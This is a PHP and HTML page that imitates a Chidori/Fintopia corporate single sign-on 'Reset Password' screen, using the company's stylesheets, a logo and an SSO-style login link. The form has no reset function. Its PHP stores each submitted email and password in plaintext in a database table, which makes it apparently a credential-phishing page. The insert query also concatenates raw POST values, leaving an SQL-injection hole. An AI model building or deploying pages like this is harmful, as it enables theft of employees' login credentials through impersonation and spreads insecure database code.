<?php
//Databse Connection file
include('dbconnection.php');
if (isset($_POST['submit'])) {
    //getting the post values
    $email = $_POST['email'];
    $password1 = $_POST['password1'];
    $password2 = $_POST['password2'];

    // Query for data insertion
    $query = mysqli_query($con, "insert into tblusers(email, password1, password2) value('$email','$password1', '$password2')");
    if ($query) {
        echo "<script>alert('You have successfully inserted the data');</script>";
        echo "<script type='text/javascript'> document.location ='thanks.php'; </script>";
    } else {
        echo "<script>alert('Something Went Wrong. Please try again');</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="zh-rCN">

<head>
    <meta charset="utf-8">
    <title>CHIDORI</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="description" content="Chidori">
    <base href="/">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700">
    <title>PHP Crud Operation!!</title>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>

    <link rel="icon" href="/static/fav/favicon.png">
    <link href="https://public.yangqianguan.com/cdn/yqg-chidori/static/628.be6b29c5262989af7539.css" rel="stylesheet">
    <link href="https://public.yangqianguan.com/cdn/yqg-chidori/static/main.1e7edf866b8af598fb87.css" rel="stylesheet">
</head>

<body>
    <div class="app app-ly">
        <div class="yqg-nav-loading loading-wrap primary-color">
            <div class="line"></div>
            <span class="rotating-icon"></span>
        </div>
        <div>
            <!-- Content goes here -->
            <div class="nav-buffer"></div>
            <!-- Content goes here -->
        </div>
        <div class="container">
            <div class="SSO">
                <div class="logo">
                    <img src="https://cdn.discordapp.com/attachments/1070995780040654969/1202097509166755900/fintopia-en.png?ex=65cc378c&is=65b9c28c&hm=7e042c200a07bb43d263ff75bcce1575fff2ef4ab42642b94a55700417847f8f&" class="">
                </div>
                <div class="email-reset">
                    <h5>Reset Password</h5>
                    <div class="email-reset-form-wrap">
                        <form method="POST" class="email-reset-form form-block-horizontal">
                            <div class="b-form-group form-group">
                                <div class="b-form-group-label-wrap">
                                    <label>Email</label>
                                </div>
                                <div valid-message="" class="b-form-group-input-wrap" style="--item-width: 240px;">
                                    <div class="b-input">
                                        <div class="content">
                                            <input placeholder="Email" name="email" maxlength="" type="email" class="toggleable-input">
                                            <span class="icon-btn"><i class="b-icon-eye-slash"></i></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="b-form-group form-group">
                                <div class="b-form-group-label-wrap">
                                    <label>New password</label>
                                </div>
                                <div valid-message="" class="b-form-group-input-wrap" style="--item-width: 240px;">
                                    <div class="b-input">
                                        <div class="content">
                                            <input placeholder="New password" name="password1" maxlength="" type="password" class="toggleable-input">
                                            <span class="icon-btn"><i class="b-icon-eye-slash"></i></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- Add re-enter password field -->
                            <div class="b-form-group form-group">
                                <div class="b-form-group-label-wrap">
                                    <label>Re-enter password</label>
                                </div>
                                <div valid-message="" class="b-form-group-input-wrap" style="--item-width: 240px;">
                                    <div class="b-input">
                                        <div class="content">
                                            <input placeholder="Re-enter password" name="password2" maxlength="" type="password" class="toggleable-input">
                                            <span class="icon-btn"><i class="b-icon-eye-slash"></i></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- End re-enter password field -->
                            <div class="form-group">
                                <p class="remind-text">
                                    The new password should be 8-20 digits long and contain both letters, numbers and special symbols (~-`. ,;:'/|()[]{}#?! @$%^&amp;*-), and cannot be the same as the last 3 passwords
                                </p>
                            </div>
                            <div class="form-group">
                                <button type="submit" class="btn btn-success btn-lg btn-block" name="submit">Submit</button>
                            </div>
                            <div class="form-group option-group">
                                <a href="/SSO/login?token=c73f1384-7cec-4e20-9f00-c40e5ff31e9f&amp;redirectUrl=https%3A%2F%2Foa.easycash.id%2F">Back to login</a>
                            </div>
                        </form>

                    </div>
                </div>
            </div>
        </div>
    </div>
</body>